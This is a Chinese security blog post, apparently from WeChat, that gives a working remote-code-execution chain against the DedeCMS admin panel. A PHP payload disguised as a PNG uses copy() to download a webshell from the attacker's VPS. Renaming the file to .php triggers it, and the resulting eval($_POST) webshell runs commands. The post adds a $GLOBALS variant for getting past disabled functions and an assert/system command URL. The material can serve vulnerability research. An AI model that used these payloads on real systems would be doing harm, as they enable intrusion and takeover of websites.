<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UM1rFRAIauAdhaZ6vJj9Zw)

#### 前言

刚发现 Dedecms 更新了发布版本，顺便测试一下之前的 day 有没有修复，突然想到了新的 tricks 去实现 RCE。

文章发布的时候估计比较晚了，一直没时间写了。

#### 利用

```
/uploads/dede/article_string_mix.php
/uploads/dede/article_template_rand.php
/uploads/dede/sys_task.php
......

```

`我发布的文档->>>>添加文档->>>>站内选择进行文件上传`

```
/uploads/dede/content_list.php](http://dedecms.xyz:8066/uploads/dede/content_list.php?mid=1)
/uploads/dede/catalog_do.php?channelid=0&cid=0&dopost=addArchives

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYeh41mMAbSo2Uy7nnffWic2ibPdSc9RxM9Hlytx7HVIpJNjKtVZB1UlD4NQ/640?wx_fmt=other)  

文件上传

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehTgxkia3ZmFzSrWBrHWiaeZXuIicMW2g52Giciaia1YKJCWib8kmK3Q0gESjTA/640?wx_fmt=other)  

在 vps 上起一个 http 的服务，端口设置为 8016

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehON217GQBd4aD35wqBPkGeRHOjurxnOzicytoveDdRR4w49kfv11aibzQ/640?wx_fmt=other)  

远程服务器存放 shell.php，文件内容为

```
<?php @eval ($_POST ['a']);?>

```

准备一个图片格式的文件, 文件内容为，这里我上传的文件名称为 f.png

```
<? copy("http://192.168.225.40:8016/shell.php","shell.php");?>

```

上传成功后可以看到上传的图片的位置

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehMViapGszd2YZt4NfIjs7Cyh6MOib3t4qAMWicU4EWckcJnOVIw5LqHVCQ/640?wx_fmt=other)  

修改文件名为`b.php`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehiaGDA3sJumzRsh8mpeSeOiaVXBuRE7J2NkNdDLtUHXkEAvNrkyXfTzOg/640?wx_fmt=other)  

保存发现 png 图片已成功被更改，访问 b.php, 从远程 vps 下载了 shell.php，当前目录下存在一个名称为 shell.php 的木马文件

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehG2Z6oj98y5Ysc2cZk9ZOh1PxiauC3odUwwYqLiaK4hpOZf2wlkf6kwAw/640?wx_fmt=other)  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehuDgpV1JNuE9so0hHAN0mDwztSNd4EfNoUibhrQ6mibiaibentwTIC7b4lg/640?wx_fmt=other)  

利用 webshell 进行命令执行。

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehsg7Jxgnic1u0Uevo9IMbGsIheVDibD4iaqcgGw5h3ggkUyvaIgP8CZZ1g/640?wx_fmt=other)  

成功执行了命令

#### 思考

如果不考虑文件上传后缀名绕过方法，仅以上面图片格式的文件上传的话，那么无所谓上传的什么内容，因为本身来讲 dede 的代码中对文件内容是做的有校验的

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehBhZCP9rhXZDHXLBetuXpCCmzPelPVibM7AZ4ey4BUVUz9q43a25mJOQ/640?wx_fmt=other)  

所以文件内有两种绕过方法

*   • 正则绕过
    
*   • disable 函数绕过
    

简单搜索了一下各个平台的文章，其实是有师傅正则绕过实现 webshell 的。第二点儿，disable 函数绕过，往前几个版本，有兴趣的可以看一下源码，之前利用全局变量`Globals`绕过

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYeh21awqZiabCCaCDSz4ngfbWWp7uTT81J2yBFlgDKOaBibRbqZfow6ecbQ/640?wx_fmt=other)  

代码内容

```
<?php
$a = $GLOBALS["_GET"];
$b = $GLOBALS["_GET"];
$a['test1']($b['test2'])
?>

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehwrfLBTK1ToVcricbJicW2ficUbgUbhu7xV1MPYIJvOplea6PvvA0ECUKw/640?wx_fmt=other)  

命令执行

http://dedecms.org:8016/uploads/shell.php?test1=assert&&test2=system(%22ipconfig%22);

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYeh2BsWFHsELmeT7qiaA9icglqPOR9qBH91Ar2faouoVdKwgsWFtafxCGVQ/640?wx_fmt=other)  

成功执行命令, 且该命令执行为未授权命令执行。

所以在官方前几个版本中已经更新了，添加进了禁用方法

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LepkZiaPBkvhnJej2E0ibMYehayFqAJfAJz8FtMGBmVkLR64jG3k8FORa1dHPA2cNWTTErrxMicdsUyQ/640?wx_fmt=other)

所以在绕过禁用方法上来讲更容易一点儿。所以在利用上这里利用了`copy`函数的特性，那么这里提醒一下，其它的函数当然也可以满足效果。

**原创稿件征集**

征集原创技术文章中，欢迎投递

投稿邮箱：edu@antvsion.com

文章类型：黑客极客技术、信息安全热点安全研究分析等安全相关

通过审核并发布能收获 200-800 元不等的稿酬。

[更多详情，点我查看！](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652885477&idx=1&sn=39e97a60d7b68d19569284654e74ffa1&chksm=bd59ad288a2e243e4d89b7c456fbd44a93d241c881075b342af22431d93dca56e52076ed75ce&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

靶场实操，戳 “阅读原文”